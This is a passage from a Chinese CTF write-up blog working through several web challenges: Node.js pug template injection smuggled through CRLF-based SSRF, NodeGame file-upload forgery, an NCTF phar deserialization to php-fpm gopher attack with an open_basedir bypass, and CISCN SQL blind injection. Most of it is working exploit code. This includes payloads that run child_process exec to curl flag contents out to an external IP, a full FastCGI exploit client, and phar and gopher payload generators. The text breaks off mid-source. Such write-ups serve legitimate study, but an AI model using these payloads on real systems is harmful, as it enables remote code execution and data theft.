有效，可执行[][\\42\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\\42] 无效，因为双引号被编码了 这里参照dalao的exphttps://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md (用的是py2,所以用虚拟机跑的才有正解): 123456789101112131415161718192021222324252627# coding=UTF-8import requestsfrom requests.utils import quotedef toOct(str): r=\"\" for i in str: if i&gt;='a'and i&lt;='z': r+='\\\\'+oct(ord(i))[1:] else: r+=i return r#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\\u&#123;xxxx&#125; is js encode pattern)#Buffer.from('http://example.com/\\u&#123;010D&#125;\\u&#123;010A&#125;/test', 'latin1').toString()#Unicode čĊ will convert to latin1 which will only pick up the right most byteSPACE=u'\\u0120'.encode('utf-8')CRLF=u'\\u010d\\u010a'.encode('utf-8') # transfer from unicode to utf-8 (\\uxxxx is unicode's pattern)SLASH=u'\\u012f'.encode('utf-8')pug = toOct('''-[][\"constructor\"][\"constructor\"](\"console.log(this.process.mainModule.require('child_process').exec('curl 120.27.246.202:8888 -X POST -d $(cat fl*)'))\")()''').replace('\"','%22').replace(\"'\",\"%27\")#' and \" need to be double encodedprint quote(pug)payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'x-forwarded-for:'+SPACE+'127.0.0.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACEres=requests.get('http://120.27.246.202:8081/core?q='+quote(payload))#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))print res.content 脚本中注意一下几点：1.单引号与双引号均需要编码两次来绕过黑名单。2.payload执行时是用- code的形式执行的。这是pug的特性。还可以#{}但是被过滤了同时还学到了javascript中等价的表达方式，比如所参考的dalao的payload中用到了 1[]['constructor']['constructor']('console.log(payload)')() 等价于 1[].constructor.constructor('alert(12345)')() 等价于 1Array.constructor('alert(12345)')() 相当于借用了数组的构造方法来调用命令。奇怪的是我又没弹到shell。curl命令到是没啥问题 NodeGame出题人思路很简单，既然这个CRLF+ssrf漏洞可以构造headers,那构造文件上传也可以喽。所以就有了这个题目先来看给的源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer(&#123;dest: './dist'&#125;).array('file'));app.use(morgan('short'));app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))app.use(\"/template\",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) &#123; var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") )&#123; res.send(\"Errrrr, You have been Blocked\"); &#125; file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);&#125;);app.post('/file_upload', function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: '', &#125; if (!ip.includes('127.0.0.1')) &#123; obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: 'upload success', filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = 'upload failed'; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get('/source', function(req, res) &#123; res.sendFile(path.join(__dirname + '/template/source.txt'));&#125;);app.get('/core', function(req, res) &#123; var q = req.query.q; var resp = \"\"; if (q) &#123; var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(\"&lt;p&gt;error occurs!&lt;/p&gt;\"); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding('utf8'); resp.on('error', function(err) &#123; if (err.code === \"ECONNRESET\") &#123; console.log(\"Timeout occurs\"); return; &#125; &#125;); resp.on('data', function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on('error', (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(\"search param 'q' missing!\"); &#125;&#125;)function blacklist(url) &#123; var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)&#125;) 关于/core不用多说，跟上面一样，而关于file_upload则类似上面那题的/flag。这样一来我们需要寻找文件上传的执行点在哪。 123456789app.get('/', function(req, res) &#123; var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") )&#123; res.send(\"Errrrr, You have been Blocked\"); &#125; file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);&#125;); 看到首页接受了一个action参数，会将我们上传到/template/目录下的文件pug渲染。并且返回值。这样的话我们思路大致就清晰了：还是通过core进行ssrf并伪造文件上传的http包访问到/flag。之后直接首页文件包含触发渲染，就可以访问到内容。由于这里直接构造头太麻烦，所以要先抓个现成的pug文件上传包伪造下，注意包里面的 123Content-Type: &#x2F;..&#x2F;templateContent-Length:292Connection:keep-alive 等参数不可随便乱改这里借赵师傅脚本小改下：https://www.zhaoj.in/read-6462.html 1234567891011121314151617181920212223242526272829303132333435import urllib.parseimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Content-Type: multipart/form-data; boundary=--------------------------191691572411478Connection: keep-alivecache-control: no-cacheHost: xContent-Length: 292-----------------------------191691572411478Content-Disposition: form-data; name=\"file\"; filename=\"exp.pug\"Content-Type: /../templatedoctype htmlhtml head style include ../../../../../../../flag.txt----------------------------919695033422425209299810--GET /flag HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)print(payload)r = requests.get('http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))print(r.text) 也是常规的把构造好的request用字符绕过。当然我们上一道题的八进制等等其他绕过我觉得都可以，毕竟此处没限制url传参不含字母。 1&#x2F;?action&#x3D;exp 成功包含flag值得一提的是我想用curl等等时又失败了，我按出题人给的方法构造包里直接放命令，结果很无语： 12345678910111213141516POST &#x2F;file_upload HTTP&#x2F;1.1Host: localhost:8081Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------12837266501973088788260782942Content-Length: 6279Origin: http:&#x2F;&#x2F;localhost:8081Connection: closeReferer: http:&#x2F;&#x2F;localhost:8081&#x2F;?action&#x3D;uploadUpgrade-Insecure-Requests: 1-----------------------------12837266501973088788260782942Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;byc403.pug&quot;Content-Type: ..&#x2F;template- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http:&#x2F;&#x2F;120.27.246.202:8877 -X POST -d $(cat &#x2F;flag.txt)&#39;)-----------------------------12837266501973088788260782942-- 提示不能 Couldn’t connect to server.然而出题人的exp里就是用的execSync+curl。我不知道什么情况。毕竟公益赛两道node题都已经证实不能curl,wget,nc,bash等等反弹shell或者连外网的操作。感觉很迷。那只能按赵师傅那样include了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"NCTF-phar-matches-everything填坑","slug":"NCTF-phar-matches-everything填坑","date":"2020-02-25T12:53:39.000Z","updated":"2021-02-18T05:09:38.746Z","comments":true,"path":"2020/02/25/NCTF-phar-matches-everything填坑/","link":"","permalink":"https://www.bycsec.top/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/","excerpt":"之前校赛web最难的一道题……当时水平菜的看都不敢看，现在按师傅要求来做做这道题。(zjy师傅说这题把php相关知识几乎全考了，看来是很集大成的一道题目。) 题目首先进去后有两个功能，一个是仅限制图片的文件上传点。另一个是用getimagesize()搭配的读取图片文件信息的功能 首先是源码泄露。在catchmachine.php存在.swp泄露。然而buuoj上题目并没有泄露，直接看源码好了","text":"之前校赛web最难的一道题……当时水平菜的看都不敢看，现在按师傅要求来做做这道题。(zjy师傅说这题把php相关知识几乎全考了，看来是很集大成的一道题目。) 题目首先进去后有两个功能，一个是仅限制图片的文件上传点。另一个是用getimagesize()搭配的读取图片文件信息的功能 首先是源码泄露。在catchmachine.php存在.swp泄露。然而buuoj上题目并没有泄露，直接看源码好了 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Easytest&#123; protected $test; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url; public function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; &#125; public function __destruct()&#123; $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test-&gt;funny_get() === '1')&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125; &#125;if(isset($_POST[\"submit\"])) &#123; $check = getimagesize($_POST['name']); if($check !== false) &#123; echo \"File is an image - \" . $check[\"mime\"] . \".\"; &#125; else &#123; echo \"File is not an image.\"; &#125;&#125;?&gt; Main类里的__destruct()居然存在反序列化，很有意思。然后如果绕过这个点将执行一段curl，这又是ssrf的点了。但是我们又要绕过getimagesize的检查，这就得利用到phar反序列化了，因为phar能绕过绝大部分文件的检查。既然如此先ssrf读文件那么构造exp: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass Easytest&#123; protected $test=\"1\"; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url=\"file:///etc/hosts\"; public function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; &#125; public function __destruct()&#123; $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test-&gt;funny_get() === '1')&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125;&#125;@unlink('phar.phar');$p = new Phar('phar.phar', 0);$p-&gt;startBuffering();$p-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ?&gt;');$o = new Main();$p-&gt;setMetadata($o);$p-&gt;addFromString('test.txt','test');$p-&gt;stopBuffering();$a = new Easytest();echo (urlencode(serialize($a)));#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D 生成的phar文件改后缀为gif,jpeg，可以绕过上传。而打印出的用于触发ssrf的魔术方法的反序列化数据则传到url中。之后再用phar://伪协议触发。这样我们就直接写出用于触发phar反序列化的exp: 1234567891011import requestsurl='http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D'data=&#123; 'name':'phar://uploads/d388a7ce2d.gif', 'submit':'1'&#125;r=requests.post(url,data=data)print(r.text) 接下来就是ssrf利用了，此处依旧是打内网。探测完 1234567&#96;&#96;&#96;bash::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters173.0.168.9 osrc 此时顺着主机探测http://173.0.168.10，可以发现有回显php-FPM要怎么利用呢？这里要提到p牛的文章：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html 具体p牛写的很详细,我们知道的，就是可以直接拿脚本利用这点，使用gopher协议传输tcp数据攻击内网，达到任意命令执行。使用如下脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293import socketimport randomimport argparseimport sysfrom io import BytesIOimport base64import urllib# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict')def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return sclass FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def gopher(self, nameValuePairs=&#123;&#125;, post=''): requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) return request def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port)if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) parser.add_argument('-e', '--ext', help='ext absolute path', default='') parser.add_argument('-if', '--include_file', help='evil.php absolute path', default='') parser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1) parser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(args.code), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; if args.ext and args.include_file: #params['PHP_ADMIN_VALUE']='extension = '+args.ext params['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\" params['PHP_VALUE']='auto_prepend_file = '+args.include_file if not args.url_format and not args.base64_format : response = client.request(params, args.code) print(force_text(response)) else: response = client.gopher(params, args.code) if args.url_format: print(urllib.quote(response)) if args.base64_format: print(base64.b64encode(response)) 调用时，依据主机ip修改参数： 1python exp.py 173.0.168.10 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u 生成的数据流我们再度生成phar文件 12345678910111213&lt;?phpclass Main &#123; public $url=\"gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00\";&#125;@unlink('phar.phar');$p = new Phar('phar.phar');$p-&gt;startBuffering();$p-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ?&gt;');$o=new Main();$p-&gt;setMetadata($o);$p-&gt;addFromString('test.txt','test');$p-&gt;stopBuffering(); 这里自己开始犯了个大错，没有给其带上9000端口.否则我们的gopher数据是发给80端口的。而实际上，我们要打的是监听9000端口的FPM。所以注意paylaod格式的端口与下划线。之后看到phpinfo()会发现又禁掉了系统函数。但是主要的要点在于bypass open_basedir。否则我们的行动会被限制在这层目录。考虑目录逻辑 12&#x2F;flag&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 直接构造payload： 1mkdir('byc');chdir('byc');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag')); 到根目录就可以拿flag了。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"CISCN-2019-web部分复现","slug":"CISCN-2019-web部分复现","date":"2020-02-19T13:30:02.000Z","updated":"2021-02-18T05:08:53.088Z","comments":true,"path":"2020/02/19/CISCN-2019-web部分复现/","link":"","permalink":"https://www.bycsec.top/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/","excerpt":"原来国赛就是CISCN……buuoj上题目挺全的，干脆选一些比较有价值的题目复现下： Hack World(盲注)简单的布尔盲注题，简单FUZZ一下发现是数值型注入。同时过滤了and，or，union空格等等。回显可以判断正误，考虑是布尔盲注。payload直接用if分流即可。空格可以%0a绕过，也可以直接括号括起来(之前总结过)","text":"原来国赛就是CISCN……buuoj上题目挺全的，干脆选一些比较有价值的题目复现下： Hack World(盲注)简单的布尔盲注题，简单FUZZ一下发现是数值型注入。同时过滤了and，or，union空格等等。回显可以判断正误，考虑是布尔盲注。payload直接用if分流即可。空格可以%0a绕过，也可以直接括号括起来(之前总结过) exp： 123456789101112131415161718192021import requests#flag&#123;3de016a6-fb79-4b56-a2fb-ea24bc26083f&#125;url='http://18733385-8c1b-4df7-88f0-1fb70bb6c05b.node3.buuoj.cn/index.php'flag=''for i in range(1,50): print(i) a=0 for j in range(32,128): payload=\"if(ascii(substr((select%0aflag%0afrom%0aflag),\"+str(i)+\",1))=\"+str(j)+\",1,2)\" data = &#123; 'id': payload &#125; res=requests.post(url,data=data) if 'Hello' in res.text: flag+=chr(j) print(flag) a=1 break if a==0: break Dropbox(phar反序列化)题目属于php反序列化。感觉国赛的题目确实质量很高，这里的反序列化利用看了源码不少时间才找出利用。赶紧记录下。首先进来注册账号登陆。发现有文件上传点。顺手传个一句话图片马，发现没有过滤。然后提供了对图片的下载与删除功能。此时依次尝试一下，发现下载功能的filename允许任意文件下载，于是直接拿到index.php的源码，接着可以拿到其他关键源码，发现是php反序列化，开始审计。index.php 123456789101112131415&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header(\"Location: login.php\"); die();&#125;?&gt;&lt;?php echo $_SESSION['username']?&gt;&lt;?phpinclude \"class.php\";$a = new FileList($_SESSION['sandbox']);$a-&gt;Name();$a-&gt;Size();?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = \"127.0.0.1\";$dbuser = \"root\";$dbpass = \"root\";$dbname = \"dropbox\";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) &#123; $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; &#125; $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) &#123; $table .= '&lt;td 